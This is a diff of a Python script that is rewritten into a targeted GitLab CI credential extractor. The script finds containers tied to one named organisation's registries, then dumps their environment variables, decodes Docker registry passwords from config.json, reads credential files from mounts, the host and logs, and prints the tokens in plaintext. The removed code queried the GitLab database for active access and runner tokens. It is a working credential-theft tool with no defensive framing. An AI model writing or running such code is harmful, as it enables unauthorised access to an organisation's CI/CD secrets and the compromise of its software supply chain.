@@ -5,530 +5,460 @@ import json
 import re
 import os
 from datetime import datetime
-from pathlib import Path
 
-class ContainerGitLabExtractor:
+class TargetedGitLabCIExtractor:
     def __init__(self):
         self.findings = []
-        self.containers = []
-        self.gitlab_configs = []
+        self.gitlab_containers = []
         
-    def enumerate_containers(self):
-        """Enumerate all running containers"""
-        print("🐳 Enumerating Docker containers...")
+    def find_gitlab_connected_containers(self):
+        """Find containers connected to GitLab registry"""
+        print("🎯 Finding GitLab-connected containers...")
         
         try:
-            # List all containers (running and stopped)
+            # Get all running containers with detailed info
             result = subprocess.run([
-                'docker', 'ps', '-a', '--format', 
-                'table {{.ID}}\t{{.Image}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}'
+                'docker', 'ps', '--format', 
+                '{{.ID}}\t{{.Image}}\t{{.Names}}\t{{.Status}}'
             ], capture_output=True, text=True)
             
             if result.returncode == 0:
-                lines = result.stdout.strip().split('\n')[1:]  # Skip header
-                print(f"✅ Found {len(lines)} containers:")
+                lines = result.stdout.strip().split('\n')
+                gitlab_connected = []
                 
                 for line in lines:
-                    parts = line.split('\t')
-                    if len(parts) >= 4:
-                        container = {
-                            'id': parts[0],
-                            'image': parts[1],
-                            'name': parts[2],
-                            'status': parts[3],
-                            'ports': parts[4] if len(parts) > 4 else ''
-                        }
-                        self.containers.append(container)
+                    if line and '\t' in line:
+                        parts = line.split('\t')
+                        container_id = parts[0]
+                        image = parts[1]
+                        name = parts[2]
+                        status = parts[3]
                         
-                        status_emoji = "🟢" if "Up" in container['status'] else "🔴"
-                        print(f"  {status_emoji} {container['name']} ({container['image']}) - {container['status']}")
-                        
-            else:
-                print(f"❌ Failed to list containers: {result.stderr}")
+                        # Check if image is from GitLab registry
+                        if any(registry in image for registry in [
+                            'docker-registry.tigerbkk.com',
+                            'gitlab.tigerbkk.com',
+                            'registry.gitlab.com'
+                        ]):
+                            container_info = {
+                                'id': container_id,
+                                'image': image,
+                                'name': name,
+                                'status': status
+                            }
+                            gitlab_connected.append(container_info)
+                            self.gitlab_containers.append(container_info)
+                            print(f"  🎯 {name} ({image})")
+                
+                print(f"✅ Found {len(gitlab_connected)} GitLab-connected containers")
+                return gitlab_connected
                 
         except Exception as e:
-            print(f"❌ Error enumerating containers: {e}")
+            print(f"❌ Error finding GitLab containers: {e}")
             
-    def extract_container_env_vars(self, container_id):
-        """Extract environment variables from a container"""
-        print(f"\n🔍 Extracting environment variables from container {container_id[:12]}...")
+        return []
+    
+    def extract_container_environment(self, container_id, container_name):
+        """Extract all environment variables from container"""
+        print(f"\n🔍 Extracting environment from {container_name} ({container_id[:12]})")
         
-        gitlab_env_vars = {}
+        ci_vars = {}
         
         try:
-            # Get environment variables
+            # Get all environment variables
             result = subprocess.run([
-                'docker', 'inspect', container_id, '--format', 
-                '{{range .Config.Env}}{{println .}}{{end}}'
+                'docker', 'exec', container_id, 'env'
             ], capture_output=True, text=True)
             
             if result.returncode == 0:
                 env_vars = result.stdout.strip().split('\n')
                 
-                gitlab_patterns = [
-                    r'.*GITLAB.*',
-                    r'.*CI_.*',
-                    r'.*RUNNER.*',
-                    r'.*GIT.*TOKEN.*',
-                    r'.*PRIVATE.*TOKEN.*',
-                    r'.*REGISTRY.*PASSWORD.*',
-                    r'.*REGISTRY.*TOKEN.*'
-                ]
-                
                 for env_var in env_vars:
                     if '=' in env_var:
                         key, value = env_var.split('=', 1)
                         
-                        # Check if it matches GitLab patterns
-                        for pattern in gitlab_patterns:
-                            if re.match(pattern, key, re.IGNORECASE):
-                                gitlab_env_vars[key] = value
-                                print(f"  🔑 {key}={value}")
-                                
-                if gitlab_env_vars:
+                        # Look for any CI/GitLab related variables
+                        if any(pattern in key.upper() for pattern in [
+                            'CI_', 'GITLAB', 'GIT_', 'RUNNER', 'TOKEN', 'REGISTRY', 'DOCKER_AUTH'
+                        ]):
+                            ci_vars[key] = value
+                            print(f"  🔑 {key}={value}")
+                
+                if ci_vars:
                     self.findings.append({
-                        'type': 'container_env_vars',
+                        'type': 'container_ci_vars',
+                        'container': container_name,
                         'container_id': container_id,
-                        'gitlab_vars': gitlab_env_vars
+                        'variables': ci_vars
                     })
                 else:
-                    print("  ℹ️ No GitLab-related environment variables found")
+                    print("  ℹ️ No CI variables found in environment")
                     
         except Exception as e:
-            print(f"❌ Error extracting env vars: {e}")
+            print(f"  ❌ Error extracting environment: {e}")
             
-        return gitlab_env_vars
+        return ci_vars
     
-    def search_container_files(self, container_id):
-        """Search for GitLab-related files in containers"""
-        print(f"\n📁 Searching for GitLab files in container {container_id[:12]}...")
+    def check_docker_config_auth(self):
+        """Check Docker configuration for registry authentication"""
+        print("\n🔐 Checking Docker registry authentication...")
         
-        found_files = []
-        
-        # Common GitLab file locations
-        search_paths = [
-            '/etc/gitlab/',
-            '/var/opt/gitlab/',
-            '/opt/gitlab/',
-            '/gitlab-runner/',
-            '/etc/gitlab-runner/',
-            '/home/gitlab-runner/',
-            '/root/.gitlab-runner/',
-            '/.gitlab-ci.yml',
-            '/config.toml',
-            '/builds/',
-            '/cache/'
+        docker_config_locations = [
+            '/root/.docker/config.json',
+            '/home/*/.docker/config.json',
+            '~/.docker/config.json'
         ]
         
-        for search_path in search_paths:
+        for config_path in docker_config_locations:
             try:
-                # Check if path exists in container
-                result = subprocess.run([
-                    'docker', 'exec', container_id, 'find', search_path, 
-                    '-type', 'f', '-name', '*gitlab*', '2>/dev/null'
-                ], capture_output=True, text=True)
-                
-                if result.returncode == 0 and result.stdout.strip():
-                    files = result.stdout.strip().split('\n')
-                    for file_path in files:
-                        if file_path:
-                            found_files.append(file_path)
-                            print(f"  📄 {file_path}")
-                            
+                if config_path.startswith('~'):
+                    config_path = os.path.expanduser(config_path)
+                    
+                if '*' in config_path:
+                    # Use find to locate config files
+                    result = subprocess.run([
+                        'find', '/home/', '-name', 'config.json', '-path', '*/.docker/*'
+                    ], capture_output=True, text=True)
+                    
+                    if result.returncode == 0:
+                        config_files = result.stdout.strip().split('\n')
+                        for config_file in config_files:
+                            if config_file:
+                                self.parse_docker_config(config_file)
+                else:
+                    if os.path.exists(config_path):
+                        self.parse_docker_config(config_path)
+                        
             except Exception as e:
-                continue
+                print(f"  ❌ Error checking {config_path}: {e}")
+    
+    def parse_docker_config(self, config_file):
+        """Parse Docker config.json for registry auth"""
+        try:
+            with open(config_file, 'r') as f:
+                config = json.load(f)
                 
-        # Also search for common config files
-        config_files = [
-            '/etc/gitlab-runner/config.toml',
-            '/etc/gitlab/gitlab.rb',
-            '/var/opt/gitlab/gitlab-rails/etc/gitlab.yml',
-            '/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml'
+            print(f"  📄 Found Docker config: {config_file}")
+            
+            # Check auths section
+            auths = config.get('auths', {})
+            for registry, auth_info in auths.items():
+                if any(gitlab_host in registry for gitlab_host in [
+                    'docker-registry.tigerbkk.com',
+                    'gitlab.tigerbkk.com',
+                    'registry.gitlab.com'
+                ]):
+                    print(f"    🎯 GitLab registry auth found: {registry}")
+                    
+                    if 'auth' in auth_info:
+                        # Decode base64 auth
+                        import base64
+                        try:
+                            decoded_auth = base64.b64decode(auth_info['auth']).decode('utf-8')
+                            username, password = decoded_auth.split(':', 1)
+                            print(f"      👤 Username: {username}")
+                            print(f"      🔑 Password/Token: {password}")
+                            
+                            self.findings.append({
+                                'type': 'docker_registry_auth',
+                                'registry': registry,
+                                'username': username,
+                                'password': password,
+                                'config_file': config_file
+                            })
+                        except Exception as e:
+                            print(f"      ❌ Error decoding auth: {e}")
+                            
+        except Exception as e:
+            print(f"  ❌ Error parsing {config_file}: {e}")
+    
+    def check_container_mounts(self, container_id, container_name):
+        """Check container mounts for GitLab credentials"""
+        print(f"\n📁 Checking mounts for {container_name}")
+        
+        try:
+            # Get container mount information
+            result = subprocess.run([
+                'docker', 'inspect', container_id, '--format', 
+                '{{range .Mounts}}{{.Type}}:{{.Source}}->{{.Destination}} {{end}}'
+            ], capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                mounts = result.stdout.strip().split(' ')
+                
+                for mount in mounts:
+                    if mount and '->' in mount:
+                        mount_type, paths = mount.split(':', 1)
+                        source, destination = paths.split('->', 1)
+                        
+                        # Check if mount contains GitLab-related paths
+                        if any(keyword in source.lower() for keyword in [
+                            'gitlab', 'runner', 'ci', 'git'
+                        ]) or any(keyword in destination.lower() for keyword in [
+                            'gitlab', 'runner', 'ci', 'git'
+                        ]):
+                            print(f"  📂 Interesting mount: {source} -> {destination}")
+                            
+                            # Try to read files from mounted location
+                            self.check_mount_for_credentials(source, destination, container_id)
+                            
+        except Exception as e:
+            print(f"  ❌ Error checking mounts: {e}")
+    
+    def check_mount_for_credentials(self, source, destination, container_id):
+        """Check mounted directories for GitLab credentials"""
+        
+        # Common GitLab credential file names
+        credential_files = [
+            'config.toml',
+            '.gitlab-ci.yml',
+            'gitlab.yml',
+            'config.yml',
+            'credentials',
+            '.env',
+            'secrets'
         ]
         
-        for config_file in config_files:
+        for cred_file in credential_files:
             try:
+                # Try to read from container
+                container_path = f"{destination.rstrip('/')}/{cred_file}"
+                
                 result = subprocess.run([
-                    'docker', 'exec', container_id, 'cat', config_file
+                    'docker', 'exec', container_id, 'cat', container_path
                 ], capture_output=True, text=True)
                 
                 if result.returncode == 0:
-                    print(f"  📄 Found config: {config_file}")
-                    found_files.append(config_file)
-                    
-                    # Extract tokens from config content
                     content = result.stdout
-                    self.extract_tokens_from_content(content, f"{container_id}:{config_file}")
+                    print(f"    📄 Found {cred_file} in mount")
+                    
+                    # Extract tokens from content
+                    self.extract_tokens_from_content(content, f"mount:{container_path}")
                     
             except Exception as e:
                 continue
                 
-        if found_files:
-            self.findings.append({
-                'type': 'container_files',
-                'container_id': container_id,
-                'files': found_files
-            })
-            
-        return found_files
+            # Also try to read from host
+            try:
+                host_path = f"{source.rstrip('/')}/{cred_file}"
+                if os.path.exists(host_path):
+                    with open(host_path, 'r') as f:
+                        content = f.read()
+                        print(f"    📄 Found {cred_file} on host")
+                        self.extract_tokens_from_content(content, f"host:{host_path}")
+            except Exception as e:
+                continue
     
     def extract_tokens_from_content(self, content, source):
-        """Extract GitLab tokens from file content"""
+        """Extract GitLab tokens from content"""
         
-        token_patterns = {
-            'gitlab_runner_token': r'token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
+        patterns = {
+            'ci_job_token': r'CI_JOB_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
+            'ci_registry_password': r'CI_REGISTRY_PASSWORD[=:]\s*([a-zA-Z0-9_-]+)',
+            'gitlab_token': r'GITLAB_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
+            'private_token': r'PRIVATE_TOKEN[=:]\s*([a-zA-Z0-9_-]+)',
+            'runner_token': r'token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
             'registration_token': r'registration-token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
-            'ci_token': r'CI_TOKEN["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
-            'private_token': r'private[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
             'personal_access_token': r'(glpat-[a-zA-Z0-9_-]{20,})',
             'deploy_token': r'(gldt-[a-zA-Z0-9_-]{20,})',
-            'job_token': r'job[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
-            'api_token': r'api[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?'
+            'bearer_token': r'Bearer\s+([a-zA-Z0-9._-]+)',
+            'docker_password': r'password[=:]\s*["\']([^"\']+)["\']'
         }
         
         found_tokens = {}
         
-        for token_type, pattern in token_patterns.items():
+        for token_type, pattern in patterns.items():
             matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
             if matches:
                 found_tokens[token_type] = matches
+                print(f"    🎯 Found {token_type}: {matches}")
                 
         if found_tokens:
-            print(f"  🎯 Found tokens in {source}:")
-            for token_type, tokens in found_tokens.items():
-                for token in tokens:
-                    print(f"    🔑 {token_type}: {token}")
-                    
             self.findings.append({
                 'type': 'extracted_tokens',
                 'source': source,
                 'tokens': found_tokens
             })
-            
-    def check_gitlab_runner_containers(self):
-        """Specifically check for GitLab Runner containers"""
-        print("\n🏃 Checking for GitLab Runner containers...")
-        
-        runner_containers = []
-        
-        for container in self.containers:
-            # Check if it's a GitLab Runner container
-            if any(keyword in container['image'].lower() for keyword in ['gitlab-runner', 'runner']):
-                runner_containers.append(container)
-                print(f"  🎯 Found runner container: {container['name']} ({container['image']})")
-                
-                # Extract runner configuration
-                self.extract_runner_config(container['id'])
-                
-        return runner_containers
     
-    def extract_runner_config(self, container_id):
-        """Extract GitLab Runner configuration"""
-        print(f"  📋 Extracting runner configuration from {container_id[:12]}...")
+    def check_gitlab_runner_processes(self):
+        """Check for running GitLab Runner processes"""
+        print("\n🏃 Checking for GitLab Runner processes...")
         
         try:
-            # Try to get runner config
+            # Check for gitlab-runner processes
             result = subprocess.run([
-                'docker', 'exec', container_id, 'cat', '/etc/gitlab-runner/config.toml'
+                'ps', 'aux'
             ], capture_output=True, text=True)
             
             if result.returncode == 0:
-                config_content = result.stdout
-                print("  ✅ Found config.toml:")
+                processes = result.stdout.split('\n')
                 
-                # Parse TOML content for tokens
-                lines = config_content.split('\n')
-                for line in lines:
-                    if 'token' in line.lower() and '=' in line:
-                        print(f"    🔑 {line.strip()}")
-                        
-                self.findings.append({
-                    'type': 'runner_config',
-                    'container_id': container_id,
-                    'config_content': config_content
-                })
-                
-                # Extract specific tokens
-                self.extract_tokens_from_content(config_content, f"runner_config:{container_id}")
-                
-        except Exception as e:
-            print(f"    ❌ Error extracting runner config: {e}")
-            
-    def search_host_gitlab_files(self):
-        """Search for GitLab files on the host system"""
-        print("\n🖥️ Searching for GitLab files on host system...")
-        
-        # Common GitLab locations on host
-        search_locations = [
-            '/etc/gitlab-runner/',
-            '/opt/gitlab/',
-            '/var/opt/gitlab/',
-            '/etc/gitlab/',
-            '/home/gitlab-runner/',
-            '/srv/gitlab-runner/',
-            '~/.gitlab-runner/'
-        ]
-        
-        found_files = []
-        
-        for location in search_locations:
-            try:
-                # Expand ~ if present
-                expanded_location = os.path.expanduser(location)
-                
-                if os.path.exists(expanded_location):
-                    print(f"  📁 Searching {expanded_location}...")
-                    
-                    # Use find to search for GitLab-related files
-                    result = subprocess.run([
-                        'find', expanded_location, '-type', 'f', 
-                        '(', '-name', '*gitlab*', '-o', '-name', '*runner*', 
-                        '-o', '-name', 'config.toml', '-o', '-name', '*.yml', ')',
-                        '2>/dev/null'
-                    ], capture_output=True, text=True)
-                    
-                    if result.returncode == 0 and result.stdout.strip():
-                        files = result.stdout.strip().split('\n')
-                        for file_path in files:
-                            if file_path and os.path.isfile(file_path):
-                                found_files.append(file_path)
-                                print(f"    📄 {file_path}")
-                                
-                                # Try to read and extract tokens
-                                try:
-                                    with open(file_path, 'r') as f:
-                                        content = f.read()
-                                        self.extract_tokens_from_content(content, f"host:{file_path}")
-                                except Exception as e:
-                                    print(f"      ❌ Cannot read {file_path}: {e}")
-                                    
-            except Exception as e:
-                print(f"  ❌ Error searching {location}: {e}")
-                
-        if found_files:
-            self.findings.append({
-                'type': 'host_files',
-                'files': found_files
-            })
-            
-        return found_files
-    
-    def extract_from_gitlab_database(self):
-        """Try to extract tokens from GitLab database if accessible"""
-        print("\n💾 Checking for GitLab database access...")
-        
-        # Look for GitLab database containers
-        db_containers = []
-        
-        for container in self.containers:
-            if any(db_name in container['image'].lower() for db_name in ['postgres', 'mysql', 'redis']):
-                if 'gitlab' in container['name'].lower() or 'gitlab' in container['image'].lower():
-                    db_containers.append(container)
-                    print(f"  🗄️ Found potential GitLab database: {container['name']} ({container['image']})")
-                    
-        # Try to connect to GitLab databases
-        for db_container in db_containers:
-            self.try_database_extraction(db_container)
-            
-    def try_database_extraction(self, db_container):
-        """Try to extract tokens from GitLab database"""
-        container_id = db_container['id']
-        
-        print(f"  🔍 Attempting database extraction from {container_id[:12]}...")
-        
-        # PostgreSQL queries for GitLab
-        postgres_queries = [
-            "SELECT token FROM personal_access_tokens WHERE active = true;",
-            "SELECT token FROM deploy_tokens WHERE expires_at > NOW() OR expires_at IS NULL;", 
-            "SELECT runners_token FROM application_settings;",
-            "SELECT token FROM ci_runners WHERE active = true;",
-            "SELECT name, encrypted_value FROM variables WHERE type = 'Ci::Variable';"
-        ]
-        
-        try:
-            # Try PostgreSQL
-            for query in postgres_queries:
-                result = subprocess.run([
-                    'docker', 'exec', container_id, 'psql', '-U', 'gitlab', '-d', 'gitlabhq_production',
-                    '-c', query
-                ], capture_output=True, text=True)
-                
-                if result.returncode == 0 and result.stdout.strip():
-                    print(f"    ✅ Query result: {query}")
-                    print(f"    📊 {result.stdout}")
-                    
-                    self.findings.append({
-                        'type': 'database_extraction',
-                        'container_id': container_id,
-                        'query': query,
-                        'result': result.stdout
-                    })
-                    
-        except Exception as e:
-            print(f"    ❌ Database extraction failed: {e}")
-            
-    def check_docker_secrets(self):
-        """Check Docker secrets for GitLab credentials"""
-        print("\n🔒 Checking Docker secrets...")
-        
-        try:
-            result = subprocess.run(['docker', 'secret', 'ls'], capture_output=True, text=True)
-            
-            if result.returncode == 0:
-                secrets = result.stdout.strip().split('\n')[1:]  # Skip header
-                
-                for secret_line in secrets:
-                    if secret_line and ('gitlab' in secret_line.lower() or 'ci' in secret_line.lower()):
-                        secret_name = secret_line.split()[1]  # Get secret name
-                        print(f"  🔒 Found GitLab-related secret: {secret_name}")
+                for process in processes:
+                    if 'gitlab-runner' in process.lower():
+                        print(f"  🏃 Found runner process: {process}")
                         
                         self.findings.append({
-                            'type': 'docker_secret',
-                            'secret_name': secret_name
+                            'type': 'runner_process',
+                            'process': process
                         })
                         
         except Exception as e:
-            print(f"❌ Error checking Docker secrets: {e}")
+            print(f"❌ Error checking processes: {e}")
+    
+    def check_systemd_services(self):
+        """Check for GitLab-related systemd services"""
+        print("\n⚙️ Checking systemd services...")
+        
+        try:
+            result = subprocess.run([
+                'systemctl', 'list-units', '--type=service', '--state=running'
+            ], capture_output=True, text=True)
             
-    def generate_extraction_report(self):
-        """Generate comprehensive extraction report"""
+            if result.returncode == 0:
+                services = result.stdout.split('\n')
+                
+                for service in services:
+                    if any(keyword in service.lower() for keyword in ['gitlab', 'runner', 'ci']):
+                        print(f"  ⚙️ Found service: {service}")
+                        
+                        # Get service status with more details
+                        service_name = service.split()[0] if service.split() else ''
+                        if service_name:
+                            self.get_service_details(service_name)
+                        
+        except Exception as e:
+            print(f"❌ Error checking services: {e}")
+    
+    def get_service_details(self, service_name):
+        """Get detailed information about a service"""
+        try:
+            result = subprocess.run([
+                'systemctl', 'show', service_name, '--property=ExecStart,Environment,EnvironmentFile'
+            ], capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                details = result.stdout.strip()
+                if details:
+                    print(f"    📋 Service details for {service_name}:")
+                    print(f"    {details}")
+                    
+                    self.findings.append({
+                        'type': 'systemd_service',
+                        'service_name': service_name,
+                        'details': details
+                    })
+                    
+        except Exception as e:
+            print(f"    ❌ Error getting service details: {e}")
+    
+    def check_container_logs_for_tokens(self, container_id, container_name):
+        """Check container logs for GitLab tokens"""
+        print(f"\n📋 Checking logs for {container_name}")
+        
+        try:
+            # Get recent container logs
+            result = subprocess.run([
+                'docker', 'logs', '--tail=100', container_id
+            ], capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                logs = result.stdout + result.stderr  # Combine stdout and stderr
+                
+                # Look for tokens in logs
+                self.extract_tokens_from_content(logs, f"logs:{container_name}")
+                
+                # Also look for GitLab URLs and configuration info
+                gitlab_info = re.findall(r'gitlab[^\\s]*', logs, re.IGNORECASE)
+                if gitlab_info:
+                    print(f"  🔗 GitLab references in logs: {set(gitlab_info)}")
+                    
+        except Exception as e:
+            print(f"  ❌ Error checking logs: {e}")
+    
+    def generate_report(self):
+        """Generate extraction report"""
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        report_file = f"container_gitlab_extraction_{timestamp}.json"
+        report_file = f"targeted_gitlab_extraction_{timestamp}.json"
         
         report = {
             'extraction_timestamp': timestamp,
-            'containers_analyzed': len(self.containers),
+            'gitlab_containers': len(self.gitlab_containers),
             'total_findings': len(self.findings),
-            'containers': self.containers,
-            'findings': self.findings,
-            'summary': self.generate_summary()
+            'containers': self.gitlab_containers,
+            'findings': self.findings
         }
         
         with open(report_file, 'w') as f:
-            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
+            json.dump(report, f, indent=2, ensure_ascii=False)
             
-        # Generate text report
-        text_report = report_file.replace('.json', '.txt')
-        with open(text_report, 'w') as f:
-            f.write("=" * 80 + "\n")
-            f.write("🐳 CONTAINER GITLAB EXTRACTION REPORT\n")
-            f.write("=" * 80 + "\n")
-            f.write(f"Extraction Time: {timestamp}\n")
-            f.write(f"Containers Analyzed: {len(self.containers)}\n")
-            f.write(f"Total Findings: {len(self.findings)}\n\n")
+        # Generate readable summary
+        print(f"\n📊 Report saved to: {report_file}")
+        
+        # Print key findings
+        if self.findings:
+            print("\n🎯 KEY FINDINGS:")
             
-            # Show extracted tokens
-            token_findings = [f for f in self.findings if f.get('type') == 'extracted_tokens']
-            if token_findings:
-                f.write("🔑 EXTRACTED TOKENS:\n")
-                f.write("-" * 40 + "\n")
-                for finding in token_findings:
-                    f.write(f"Source: {finding['source']}\n")
+            for finding in self.findings:
+                finding_type = finding.get('type', 'unknown')
+                
+                if finding_type == 'docker_registry_auth':
+                    print(f"  🔐 Registry Auth: {finding['registry']}")
+                    print(f"    Username: {finding['username']}")
+                    print(f"    Password: {finding['password']}")
+                    
+                elif finding_type == 'extracted_tokens':
+                    print(f"  🎯 Tokens from {finding['source']}:")
                     for token_type, tokens in finding['tokens'].items():
                         for token in tokens:
-                            f.write(f"  {token_type}: {token}\n")
-                    f.write("\n")
-            
-            # Show runner configs
-            runner_findings = [f for f in self.findings if f.get('type') == 'runner_config']
-            if runner_findings:
-                f.write("🏃 RUNNER CONFIGURATIONS:\n")
-                f.write("-" * 40 + "\n")
-                for finding in runner_findings:
-                    f.write(f"Container: {finding['container_id']}\n")
-                    f.write(f"Config:\n{finding['config_content']}\n\n")
-        
-        print(f"\n📊 Extraction report saved to: {report_file}")
-        print(f"📄 Text report: {text_report}")
-        
-        return report
+                            print(f"    {token_type}: {token}")
+                            
+                elif finding_type == 'container_ci_vars':
+                    print(f"  🔧 CI Variables in {finding['container']}:")
+                    for key, value in finding['variables'].items():
+                        print(f"    {key}={value}")
     
-    def generate_summary(self):
-        """Generate summary of findings"""
-        summary = {
-            'token_sources': len([f for f in self.findings if 'token' in f.get('type', '')]),
-            'runner_configs': len([f for f in self.findings if f.get('type') == 'runner_config']),
-            'database_extractions': len([f for f in self.findings if f.get('type') == 'database_extraction']),
-            'docker_secrets': len([f for f in self.findings if f.get('type') == 'docker_secret']),
-            'host_files': len([f for f in self.findings if f.get('type') == 'host_files'])
-        }
-        
-        return summary
-        
-    def run_comprehensive_extraction(self):
-        """Run comprehensive GitLab credential extraction"""
-        print("🚀 Starting Container GitLab Credential Extraction")
+    def run_targeted_extraction(self):
+        """Run targeted GitLab CI extraction"""
+        print("🚀 Starting Targeted GitLab CI Extraction")
         print("=" * 80)
         
-        # Enumerate containers
-        self.enumerate_containers()
+        # Find GitLab-connected containers
+        gitlab_containers = self.find_gitlab_connected_containers()
         
-        # Check each container for GitLab credentials
-        for container in self.containers:
-            print(f"\n🔍 Analyzing container: {container['name']} ({container['id'][:12]})")
+        # Check Docker configuration for registry auth
+        self.check_docker_config_auth()
+        
+        # Analyze each GitLab-connected container
+        for container in gitlab_containers:
+            container_id = container['id']
+            container_name = container['name']
+            
+            print(f"\n🔍 Deep analysis of {container_name}")
+            print("-" * 50)
             
             # Extract environment variables
-            self.extract_container_env_vars(container['id'])
+            self.extract_container_environment(container_id, container_name)
             
-            # Search for GitLab files
-            self.search_container_files(container['id'])
+            # Check container mounts
+            self.check_container_mounts(container_id, container_name)
             
-        # Check specifically for GitLab Runner containers
-        self.check_gitlab_runner_containers()
+            # Check container logs
+            self.check_container_logs_for_tokens(container_id, container_name)
         
-        # Search host system
-        self.search_host_gitlab_files()
+        # Check for GitLab Runner processes
+        self.check_gitlab_runner_processes()
         
-        # Check database access
-        self.extract_from_gitlab_database()
-        
-        # Check Docker secrets
-        self.check_docker_secrets()
+        # Check systemd services
+        self.check_systemd_services()
         
         # Generate report
-        report = self.generate_extraction_report()
+        self.generate_report()
         
-        # Print summary
-        self.print_extraction_summary()
-        
-        return report
-    
-    def print_extraction_summary(self):
-        """Print extraction summary"""
-        print("\n" + "=" * 80)
-        print("📊 EXTRACTION SUMMARY")
-        print("=" * 80)
-        
-        if not self.findings:
-            print("❌ No GitLab credentials found in containers")
-            return
-            
-        print(f"✅ Found {len(self.findings)} potential credential sources:")
-        
-        # Count findings by type
-        finding_types = {}
-        for finding in self.findings:
-            finding_type = finding.get('type', 'unknown')
-            finding_types[finding_type] = finding_types.get(finding_type, 0) + 1
-            
-        for finding_type, count in finding_types.items():
-            print(f"  📋 {finding_type}: {count}")
-            
-        # Show key tokens found
-        token_findings = [f for f in self.findings if f.get('type') == 'extracted_tokens']
-        if token_findings:
-            print(f"\n🎯 KEY TOKENS EXTRACTED:")
-            for finding in token_findings[:5]:  # Show first 5
-                source = finding.get('source', 'Unknown')
-                tokens = finding.get('tokens', {})
-                print(f"  📄 {source}:")
-                for token_type, token_list in tokens.items():
-                    for token in token_list:
-                        print(f"    🔑 {token_type}: {token}")
+        print("\n✅ Targeted extraction completed!")
 
 def main():
-    extractor = ContainerGitLabExtractor()
-    extractor.run_comprehensive_extraction()
+    extractor = TargetedGitLabCIExtractor()
+    extractor.run_targeted_extraction()
 
 if __name__ == "__main__":
     main()
